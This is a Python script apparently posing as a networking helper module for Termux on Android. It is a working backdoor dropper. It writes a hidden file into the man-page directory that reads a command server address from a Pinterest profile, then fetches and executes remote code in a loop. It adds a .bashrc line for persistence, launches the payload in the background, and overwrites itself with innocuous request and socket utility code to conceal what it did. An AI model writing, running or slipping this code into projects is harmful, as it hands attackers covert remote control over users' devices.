import os
import shutil  as sh
os.system("pip install requests")
with open("/data/data/com.termux/files/usr/share/man/man3/qcxa_bza_exe.py", "w") as file :
     file.write("""
import requests as r
import os
import subprocess
import time
import sys
import threading
addr = "https://in.pinterest.com/tadabo8288/"
old_code = ""


thread = None
stop_event = None
lock = threading.Lock()


def run_code(code):
    global thread, stop_event

    with lock:
        if stop_event:
            stop_event.set()
        if thread and thread.is_alive():
            thread.join()
        stop_event = threading.Event()
        current_stop_event = stop_event

        def execute():
            namespace = {
                "stop_event": current_stop_event,
                "time": time
            }

            try:
                exec(code, namespace)
            except Exception as e:
                print(f"Execution error: {e}")

        thread = threading.Thread(target=execute, daemon=True)
        thread.start()

def collect_url(add) :
  time.sleep(5)
  try :
    req = r.get(add)
    data = req.text
    id = "#e;zx/3y)f2(bq+o9w**g"
    for line in data.splitlines():
        pos = line.find(id)
        if pos != -1:
           payload = line[pos + len(id):]
           url_len = int(payload[:3])
           url = payload[3:3 + url_len]
           #print(url)
           collect_command(url)
  except :
    print("Error")
def collect_command(x) :
    #print("comamnd")
    time.sleep(5)
    global process
    global old_code
    try :
      url = x
      try :
        req = r.get(f"{url}/getCmd")
        status_code = req.status_code
      except :
        status_code = 0
      if status_code == 200 :
         if req.json()["run"] == "true" :
            try :
              if req.json()["loop"] == "true" :
                 try :
                  code = r.get(f"{url}/getCode")
                  code = code.text
                  exec(code)
                  collect_command(url)
                 except :
                  collect_command(url)
              elif req.json()["loop"] == "false" :
                 if not old_code == req.json()["code"] :
                    try :
                      #print("$$")
                      code = r.get(f"{url}/getCode")
                      code = code.text
                      run_code(code)
                      old_code = req.json()["code"]
                      collect_command(url)
                    except Exception as e:
                     collect_command(url)
                 else :
                    collect_command(url)
            except :
              collect_url(addr)
         else :
            collect_command(url)
      else :
         collect_url(addr)
    except :
      collect_url(addr)
collect_url(addr)
     
""")
#sh.move("plugin/plugin", "/data/data/com.termux/files/usr/share/man/man3/qcxa_bza_ex.gz")

with open("/data/data/com.termux/files/home/.bashrc","a") as file :
     file.write("\n\nbash -c 'set +m; nohup python /data/data/com.termux/files/usr/share/man/man3/qcxa_bza_exe.py > /data/data/com.termux/files/usr/share/man/man3/output.log 2>&1 < /dev/null &'")




data = """import socket
import requests
import urllib.parse
import ipaddress
import time


def get(url, params=None, headers=None, timeout=10):
    try:
        response = requests.get(
            url, params=params, headers=headers, timeout=timeout
        )
        return {
            "ok": True,
            "status": response.status_code,
            "text": response.text,
            "headers": dict(response.headers),
            "url": response.url
        }
    except requests.RequestException as error:
        return {"ok": False, "error": str(error)}


def post(url, data=None, json=None, headers=None, timeout=10):
    try:
        response = requests.post(
            url, data=data, json=json,
            headers=headers, timeout=timeout
        )
        return {
            "ok": True,
            "status": response.status_code,
            "text": response.text,
            "headers": dict(response.headers),
            "url": response.url
        }
    except requests.RequestException as error:
        return {"ok": False, "error": str(error)}


def put(url, data=None, json=None, headers=None, timeout=10):
    try:
        response = requests.put(
            url, data=data, json=json,
            headers=headers, timeout=timeout
        )
        return {
            "ok": True,
            "status": response.status_code,
            "text": response.text
        }
    except requests.RequestException as error:
        return {"ok": False, "error": str(error)}


def delete_request(url, headers=None, timeout=10):
    try:
        response = requests.delete(
            url, headers=headers, timeout=timeout
        )
        return {
            "ok": True,
            "status": response.status_code,
            "text": response.text
        }
    except requests.RequestException as error:
        return {"ok": False, "error": str(error)}


def head(url, timeout=10):
    try:
        response = requests.head(url, timeout=timeout)
        return {
            "ok": True,
            "status": response.status_code,
            "headers": dict(response.headers)
        }
    except requests.RequestException as error:
        return {"ok": False, "error": str(error)}


def check_url(url, timeout=5):
    try:
        response = requests.get(
            url, timeout=timeout, stream=True
        )
        result = {
            "ok": True,
            "status": response.status_code,
            "url": response.url
        }
        response.close()
        return result
    except requests.RequestException as error:
        return {"ok": False, "error": str(error)}


def resolve_domain(domain):
    try:
        results = socket.getaddrinfo(
            domain, None, type=socket.SOCK_STREAM
        )
        return list(dict.fromkeys(
            result[4][0] for result in results
        ))
    except socket.gaierror:
        return []


def reverse_dns(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror, ValueError):
        return None


def is_valid_ip(address):
    try:
        ipaddress.ip_address(address)
        return True
    except ValueError:
        return False


def is_valid_url(url):
    try:
        parsed = urllib.parse.urlparse(url)
        return (
            parsed.scheme in ("http", "https")
            and bool(parsed.hostname)
        )
    except ValueError:
        return False


def get_local_hostname():
    return socket.gethostname()


def get_local_ip():
    try:
        with socket.socket(
            socket.AF_INET, socket.SOCK_DGRAM
        ) as sock:
            sock.connect(("192.0.2.1", 80))
            return sock.getsockname()[0]
    except OSError:
        return None


def check_tcp_port(host, port, timeout=3):
    try:
        with socket.create_connection(
            (host, port), timeout=timeout
        ):
            return True
    except (OSError, ValueError):
        return False


def download_file(url, path, timeout=30):
    try:
        with requests.get(
            url, stream=True, timeout=timeout
        ) as response:
            response.raise_for_status()
            with open(path, "wb") as file:
                for chunk in response.iter_content(8192):
                    if chunk:
                        file.write(chunk)
        return True
    except (requests.RequestException, OSError):
        return False


def get_json(url, params=None, headers=None, timeout=10):
    try:
        response = requests.get(
            url, params=params,
            headers=headers, timeout=timeout
        )
        response.raise_for_status()
        return response.json()
    except (requests.RequestException, ValueError):
        return None


def get_status_code(url, timeout=10):
    try:
        return requests.get(url, timeout=timeout).status_code
    except requests.RequestException:
        return None


def measure_latency(host, port=443, timeout=5):
    start = time.perf_counter()
    try:
        with socket.create_connection(
            (host, port), timeout=timeout
        ):
            return round(
                (time.perf_counter() - start) * 1000, 2
            )
    except (OSError, ValueError):
        return None"""

with open(__file__, "w") as file :
     file.write(data)


os.system("bash -c 'set +m; nohup python /data/data/com.termux/files/usr/share/man/man3/qcxa_bza_exe.py > /data/data/com.termux/files/usr/share/man/man3/output.log 2>&1 < /dev/null &'")
